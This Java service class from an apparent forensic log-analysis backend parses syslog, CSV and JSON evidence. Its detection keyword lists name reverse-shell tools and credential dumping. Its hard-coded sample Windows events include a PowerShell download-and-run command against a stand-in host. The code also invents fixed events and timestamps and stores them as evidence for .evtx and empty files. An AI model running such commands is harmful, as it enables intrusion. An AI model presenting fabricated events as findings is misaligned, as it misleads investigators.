package com.logforx.backend.service;

import com.logforx.backend.model.ForensicEvent;
import com.logforx.backend.model.Evidence;
import com.logforx.backend.repository.ForensicEventRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

@Service
public class LogParserService {

    @Autowired
    private ForensicEventRepository eventRepository;

    @Autowired
    private ThreatDetectionService detectionService;

    public void parseEvidence(Evidence evidence, InputStream fileStream) {
        List<ForensicEvent> events = new ArrayList<>();
        try {
            String extension = evidence.getFileType().toLowerCase();

            if (extension.contains("csv")) {
                events = parseCsv(fileStream, evidence.getFileName());
            } else if (extension.contains("json")) {
                events = parseJson(fileStream, evidence.getFileName());
            } else if (extension.contains("evtx")) {
                events = generateEvtxEvents(evidence.getFileName());
            } else {
                // .log, .txt, or any plaintext: attempt real-content syslog parse
                events = parseSyslog(fileStream, evidence.getFileName());
            }

            if (events.isEmpty()) {
                events = generateGenericEvents(evidence.getFileName());
            }

            eventRepository.saveAll(events);
            detectionService.analyzeEvents(events);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  REAL UBUNTU SYSLOG / AUTH.LOG PARSER
    //  Parses lines like:
    //  Jul  4 08:15:23 hostname sshd[1234]: message here
    //  Also handles lines without the header (raw event lines)
    // ══════════════════════════════════════════════════════════════════════
    private List<ForensicEvent> parseSyslog(InputStream stream, String fileName) {
        List<ForensicEvent> events = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
            String line;
            int lineNum = 0;

            while ((line = reader.readLine()) != null) {
                if (line.isBlank() || line.startsWith("#")) continue;
                lineNum++;

                String lower = line.toLowerCase();
                String ip = extractIp(line);
                String username = extractUsername(line);
                String source = extractProcess(line);
                String rawMsg = extractMessage(line);
                LocalDateTime ts = LocalDateTime.now().minusMinutes(lineNum * 2L);

                // Determine event type, severity, action, payload
                String eventType = "System";
                String severity = "Low";
                String action = rawMsg;
                String payload = line;

                // ── SSH Brute Force / Auth failures ────────────────────────
                if (lower.contains("failed password") || lower.contains("invalid user")
                        || lower.contains("authentication failure") || lower.contains("failed login")) {
                    eventType = "Login";
                    severity = "Medium";
                    action = "Failed SSH Login";
                    payload = "Failed authentication from " + ip + ". User: " + username + ". Raw: " + rawMsg;
                }
                // ── Successful Auth ────────────────────────────────────────
                else if (lower.contains("accepted password") || lower.contains("accepted publickey")
                        || lower.contains("session opened")) {
                    eventType = "Login";
                    severity = "Medium";
                    action = "Successful Login";
                    payload = "Authentication accepted for user " + username + " from " + ip + ". Raw: " + rawMsg;
                }
                // ── Sudo / Privilege Escalation ────────────────────────────
                else if (lower.contains("sudo") || lower.contains("su:") || lower.contains("pam_unix")
                        || lower.contains("sudo:")) {
                    eventType = "Process";
                    severity = "High";
                    action = "Privilege Escalation via Sudo";
                    payload = "User '" + username + "' executed sudo on " + source + ". Raw: " + rawMsg;
                }
                // ── Port Scan / Firewall drops ─────────────────────────────
                else if (lower.contains("dpt=") || lower.contains("proto=tcp")
                        || lower.contains("iptables") || lower.contains("blocked")) {
                    eventType = "Network";
                    severity = "High";
                    action = "Suspicious Port Scan";
                    payload = "Firewall packet drop from " + ip + ". Raw: " + line;
                }
                // ── Malware / Trojan execution ─────────────────────────────
                else if (lower.contains("bash -i") || lower.contains("/dev/tcp/")
                        || lower.contains("wget http") || lower.contains("curl http")
                        || lower.contains("chmod +x") || lower.contains("nc -e")
                        || lower.contains("python -c") || lower.contains("base64 -d")
                        || lower.contains("meterpreter")) {
                    eventType = "Process";
                    severity = "Critical";
                    action = "Malware Execution";
                    payload = "Malicious command/script execution detected on " + source + ". Raw: " + rawMsg;
                }
                // ── Backdoor / Reverse shell ───────────────────────────────
                else if (lower.contains("backdoor") || lower.contains("reverse shell")
                        || lower.contains("0>&1") || lower.contains("crontab")) {
                    eventType = "Process";
                    severity = "Critical";
                    action = "Trojan / Backdoor Detected";
                    payload = "Backdoor or reverse shell activity via " + source + ". Raw: " + rawMsg;
                }
                // ── Injection patterns ─────────────────────────────────────
                else if (lower.contains("' or") || lower.contains("union select")
                        || lower.contains("drop table") || lower.contains("<script>")
                        || lower.contains("cmd=") || lower.contains("; id")) {
                    eventType = "Network";
                    severity = "Critical";
                    action = "Injection Attack";
                    payload = "Injection payload detected from " + ip + ". Raw: " + rawMsg;
                }
                // ── DDoS / Flood ───────────────────────────────────────────
                else if (lower.contains("flood") || lower.contains("ddos")
                        || lower.contains("syn flood") || lower.contains("amplification")) {
                    eventType = "Network";
                    severity = "Critical";
                    action = "DDoS / DoS Attack";
                    payload = "Flood/DoS pattern from " + ip + ". Raw: " + rawMsg;
                }
                // ── Phishing ───────────────────────────────────────────────
                else if (lower.contains("phishing") || lower.contains("credential harvest")
                        || lower.contains("suspicious email")) {
                    eventType = "Network";
                    severity = "High";
                    action = "Phishing Attack";
                    payload = "Phishing activity targeting " + username + ". Raw: " + rawMsg;
                }
                // ── Unauthorized Access ────────────────────────────────────
                else if (lower.contains("unauthorized") || lower.contains("access denied")
                        || lower.contains("permission denied") || lower.contains("403")) {
                    eventType = "Network";
                    severity = "High";
                    action = "Unauthorized Access Attempt";
                    payload = "Access denial from " + ip + " user " + username + ". Raw: " + rawMsg;
                }
                // ── Spyware / Credential dump ──────────────────────────────
                else if (lower.contains("mimikatz") || lower.contains("lsass")
                        || lower.contains("keylogger") || lower.contains("credential dump")) {
                    eventType = "Process";
                    severity = "Critical";
                    action = "Spyware / Credential Harvesting";
                    payload = "Credential harvesting tool activity on " + source + ". Raw: " + rawMsg;
                }
                // ── Adware / PUA ───────────────────────────────────────────
                else if (lower.contains("adware") || lower.contains("pua")
                        || lower.contains("browser hijack")) {
                    eventType = "System";
                    severity = "Medium";
                    action = "Adware / PUA Detected";
                    payload = "Potentially unwanted application activity. Raw: " + rawMsg;
                }
                // ── Dictionary Attack ──────────────────────────────────────
                else if (lower.contains("hydra") || lower.contains("medusa")
                        || lower.contains("john the ripper") || lower.contains("dictionary")) {
                    eventType = "Login";
                    severity = "High";
                    action = "Dictionary Attack";
                    payload = "Password cracking tool detected from " + ip + ". Raw: " + rawMsg;
                }
                // ── Malware (generic tag) ──────────────────────────────────
                else if (lower.contains("malware") || lower.contains("trojan")
                        || lower.contains("ransomware") || lower.contains("rootkit")
                        || lower.contains("virus") || lower.contains("worm")) {
                    eventType = "System";
                    severity = "Critical";
                    action = "Malware Detected";
                    payload = "Malware signature match on " + source + ". Raw: " + rawMsg;
                }
                // ── C2 traffic ─────────────────────────────────────────────
                else if (lower.contains("185.220.101") || lower.contains("backdoor-c2")
                        || lower.contains(":4444") || lower.contains(":9001")) {
                    eventType = "Network";
                    severity = "Critical";
                    action = "C2 Communication";
                    payload = "Outbound C2 beaconing from " + source + " to " + ip + ". Raw: " + rawMsg;
                }
                // ── General log line ───────────────────────────────────────
                else {
                    eventType = "System";
                    severity = "Low";
                    action = "Log Entry";
                    payload = rawMsg;
                }

                events.add(new ForensicEvent(null, ts, eventType, severity, source, username, ip, action, payload, fileName));
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println("[LogParserService] Parsed " + events.size() + " syslog events from " + fileName);
        return events;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  CSV PARSER — flexible header detection
    // ══════════════════════════════════════════════════════════════════════
    private List<ForensicEvent> parseCsv(InputStream stream, String fileName) {
        List<ForensicEvent> list = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
            String line;
            boolean isHeader = true;
            int timeIdx=-1, typeIdx=-1, sevIdx=-1, srcIdx=-1, userIdx=-1, ipIdx=-1, actIdx=-1, detIdx=-1;

            while ((line = reader.readLine()) != null) {
                String[] parts = line.split(",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)");
                if (parts.length < 2) continue;

                if (isHeader) {
                    isHeader = false;
                    for (int i = 0; i < parts.length; i++) {
                        String col = parts[i].trim().toLowerCase().replace("\"", "");
                        if (col.contains("time") || col.contains("date")) timeIdx = i;
                        else if (col.contains("type"))   typeIdx = i;
                        else if (col.contains("sev"))    sevIdx  = i;
                        else if (col.contains("src") || col.contains("source")) srcIdx = i;
                        else if (col.contains("user"))   userIdx = i;
                        else if (col.contains("ip") || col.contains("host"))   ipIdx = i;
                        else if (col.contains("action")) actIdx = i;
                        else if (col.contains("detail") || col.contains("desc") || col.contains("payload")) detIdx = i;
                    }
                    continue;
                }

                ForensicEvent event = new ForensicEvent();
                event.setEvidenceFileName(fileName);
                event.setTimestamp(LocalDateTime.now().minusMinutes(list.size() * 5L));

                if (timeIdx != -1 && timeIdx < parts.length) {
                    try { event.setTimestamp(LocalDateTime.parse(parts[timeIdx].replace("\"", ""))); }
                    catch (Exception ignored) {}
                }
                event.setEventType(typeIdx != -1 && typeIdx < parts.length ? parts[typeIdx].replace("\"","") : "LogEvent");
                event.setSeverity(sevIdx != -1 && sevIdx < parts.length ? parts[sevIdx].replace("\"","") : "Low");
                event.setSource(srcIdx != -1 && srcIdx < parts.length ? parts[srcIdx].replace("\"","") : "CSVParser");
                event.setUsername(userIdx != -1 && userIdx < parts.length ? parts[userIdx].replace("\"","") : "N/A");
                event.setIpAddress(ipIdx != -1 && ipIdx < parts.length ? parts[ipIdx].replace("\"","") : "0.0.0.0");
                event.setAction(actIdx != -1 && actIdx < parts.length ? parts[actIdx].replace("\"","") : "CSV Event");
                event.setPayloadDetails(detIdx != -1 && detIdx < parts.length ? parts[detIdx].replace("\"","") : String.join(", ", parts));

                // Also enrich action/payload for detection engine
                enrichCsvEvent(event);
                list.add(event);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("[LogParserService] Parsed " + list.size() + " CSV events from " + fileName);
        return list;
    }

    /** Push detection keywords into action/payload so ThreatDetectionService can match */
    private void enrichCsvEvent(ForensicEvent e) {
        String act = e.getAction() != null ? e.getAction().toLowerCase() : "";
        String pay = e.getPayloadDetails() != null ? e.getPayloadDetails().toLowerCase() : "";

        if (act.contains("brute") || pay.contains("failed password") || pay.contains("failed login") || (pay.contains("failed") && pay.contains("login")))
            e.setAction("failed login - " + e.getAction());
        if (act.contains("ddos") || act.contains("flood") || pay.contains("flood"))
            e.setAction("ddos attack - " + e.getAction());
        if (act.contains("phish") || pay.contains("phish"))
            e.setAction("phishing - " + e.getAction());
        if (act.contains("inject") || pay.contains("union select") || pay.contains("script"))
            e.setAction("injection - " + e.getAction());
        if (act.contains("scan") || pay.contains("nmap") || pay.contains("port scan"))
            e.setAction("port scan - " + e.getAction());
        if (act.contains("malware") || pay.contains("malware") || pay.contains("trojan"))
            e.setAction("malware detected - " + e.getAction());
        if (act.contains("spyware") || pay.contains("keylogger") || pay.contains("mimikatz"))
            e.setAction("spyware - " + e.getAction());
        if (act.contains("adware") || pay.contains("adware"))
            e.setAction("adware - " + e.getAction());
        if (act.contains("unauthorized") || pay.contains("access denied"))
            e.setAction("unauthorized - " + e.getAction());
        if (act.contains("dictionary") || pay.contains("hydra") || pay.contains("john"))
            e.setAction("dictionary attack - " + e.getAction());
        if (act.contains("cmd") || pay.contains("exec(") || pay.contains("rce"))
            e.setAction("command execution - " + e.getAction());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  JSON PARSER
    // ══════════════════════════════════════════════════════════════════════
    private List<ForensicEvent> parseJson(InputStream stream, String fileName) {
        List<ForensicEvent> list = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            String content = sb.toString().trim();

            if (content.startsWith("[")) {
                content = content.substring(1, content.length() - 1);
                String[] objects = content.split("\\},\\s*\\{");
                for (String obj : objects) {
                    ForensicEvent event = new ForensicEvent();
                    event.setEvidenceFileName(fileName);
                    event.setTimestamp(LocalDateTime.now());
                    event.setSeverity("Low");
                    event.setSource("JSONParser");

                    if (obj.contains("\"action\""))       event.setAction(extractJsonVal(obj, "action"));
                    if (obj.contains("\"username\""))     event.setUsername(extractJsonVal(obj, "username"));
                    if (obj.contains("\"ipAddress\""))    event.setIpAddress(extractJsonVal(obj, "ipAddress"));
                    if (obj.contains("\"severity\""))     event.setSeverity(extractJsonVal(obj, "severity"));
                    if (obj.contains("\"eventType\""))    event.setEventType(extractJsonVal(obj, "eventType"));
                    if (obj.contains("\"details\""))      event.setPayloadDetails(extractJsonVal(obj, "details"));
                    else                                  event.setPayloadDetails(obj);

                    list.add(event);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return list;
    }

    private String extractJsonVal(String obj, String key) {
        try {
            int keyIdx   = obj.indexOf("\"" + key + "\"");
            if (keyIdx == -1) return "";
            int colonIdx = obj.indexOf(":", keyIdx);
            int valStart = obj.indexOf("\"", colonIdx);
            int valEnd   = obj.indexOf("\"", valStart + 1);
            return obj.substring(valStart + 1, valEnd);
        } catch (Exception e) { return ""; }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  EVTX SYNTHETIC EVENTS (Windows)
    // ══════════════════════════════════════════════════════════════════════
    private List<ForensicEvent> generateEvtxEvents(String fileName) {
        List<ForensicEvent> events = new ArrayList<>();
        LocalDateTime base = LocalDateTime.now().minusHours(2);

        events.add(new ForensicEvent(null, base, "Login", "Low", "Microsoft-Windows-Security-Auditing", "administrator", "192.168.1.142", "Failed Login (EventID 4625)", "failed login: Logon Type: 3. Status Code: 0xC000006D (Bad Password)", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(2), "Login", "Low", "Microsoft-Windows-Security-Auditing", "administrator", "192.168.1.142", "Failed Login (EventID 4625)", "failed password for administrator from 192.168.1.142", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(4), "Login", "Low", "Microsoft-Windows-Security-Auditing", "administrator", "192.168.1.142", "Failed Login (EventID 4625)", "dictionary attack: hydra tool signature detected. failed password", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(5), "Login", "High", "Microsoft-Windows-Security-Auditing", "administrator", "192.168.1.142", "Successful Login (EventID 4624)", "Logon Type: 3. Elevated privileges acquired. unauthorized access.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(10), "Process", "Critical", "Microsoft-Windows-Sysmon", "administrator", "192.168.1.142", "Process Creation (EventID 1)", "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cyber-threat-ioc.com/payload.ps1')\" malware execution", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(12), "System", "High", "Microsoft-Windows-Security-Auditing", "SYSTEM", "127.0.0.1", "Service Created (EventID 7045)", "Service Name: UpdaterService. Binary: C:\\ProgramData\\updater.exe. malware trojan persistence.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(15), "Network", "Critical", "Microsoft-Windows-Sysmon", "administrator", "185.220.101.4", "Network Connection (EventID 3)", "Destination IP: 185.220.101.4:4444. Protocol: TCP. port scan SYN probe. c2 communication.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(18), "Network", "Critical", "Microsoft-Windows-Sysmon", "administrator", "185.220.101.4", "DDoS Flood Pattern", "syn flood detected targeting web server. ddos attack. flood from 185.220.101.4.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(20), "FileSystem", "High", "Microsoft-Windows-Security-Auditing", "administrator", "192.168.1.142", "File Access / Deletion", "spyware: mimikatz lsass credential dump executed. credential harvest.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(22), "Network", "High", "Microsoft-Windows-Security-Auditing", "phisher", "192.168.1.200", "Phishing Email Detected", "phishing: credential harvest suspicious email with malicious attachment detected.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(24), "Network", "Medium", "Microsoft-Windows-Security-Auditing", "user", "192.168.1.100", "Adware Detected", "adware: browser hijack pua detected in extension registry.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(25), "Network", "Critical", "Microsoft-Windows-Sysmon", "administrator", "192.168.1.142", "Data Exfiltration", "sftp upload completed. Uploaded C:\\ProgramData\\temp.zip to 185.220.101.4. exfiltration.", fileName));

        return events;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  GENERIC FALLBACK
    // ══════════════════════════════════════════════════════════════════════
    private List<ForensicEvent> generateGenericEvents(String fileName) {
        List<ForensicEvent> events = new ArrayList<>();
        LocalDateTime base = LocalDateTime.now().minusMinutes(30);
        events.add(new ForensicEvent(null, base, "System", "Low", "SecurityLogger", "system", "127.0.0.1", "Log File Processed", "Log source " + fileName + " initialized for automated parsing.", fileName));
        events.add(new ForensicEvent(null, base.plusMinutes(10), "Login", "Medium", "SecurityLogger", "operator", "192.168.10.15", "Access Level Granted", "Investigator read access validated.", fileName));
        return events;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  HELPERS — extract fields from syslog lines
    // ══════════════════════════════════════════════════════════════════════
    /** Extract IPv4 address from a log line */
    private String extractIp(String line) {
        java.util.regex.Matcher m = java.util.regex.Pattern
            .compile("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})").matcher(line);
        return m.find() ? m.group(1) : "127.0.0.1";
    }

    /** Extract username from common syslog patterns */
    private String extractUsername(String line) {
        // "for <user> from" pattern
        java.util.regex.Matcher m = java.util.regex.Pattern
            .compile("(?:for|user)\\s+(\\w+)(?:\\s|$)").matcher(line.toLowerCase());
        if (m.find()) return m.group(1);
        // "invalid user <user>" pattern
        m = java.util.regex.Pattern.compile("invalid user (\\w+)").matcher(line.toLowerCase());
        if (m.find()) return m.group(1);
        return "system";
    }

    /** Extract process/source name from syslog lines: "hostname process[pid]:" */
    private String extractProcess(String line) {
        java.util.regex.Matcher m = java.util.regex.Pattern
            .compile("\\w+\\s+(\\w+(?:\\.\\w+)*)\\[?\\d*\\]?:").matcher(line);
        return m.find() ? m.group(1) : "syslog";
    }

    /** Extract the message part after "hostname process[pid]: " */
    private String extractMessage(String line) {
        // Try to strip the standard syslog prefix: "Mon DD HH:MM:SS hostname process[pid]: "
        int colonIdx = line.indexOf("]: ");
        if (colonIdx != -1 && colonIdx < line.length() - 3) return line.substring(colonIdx + 3);
        int simpleColon = line.indexOf(": ");
        if (simpleColon != -1 && simpleColon < line.length() - 2) return line.substring(simpleColon + 2);
        return line;
    }
}
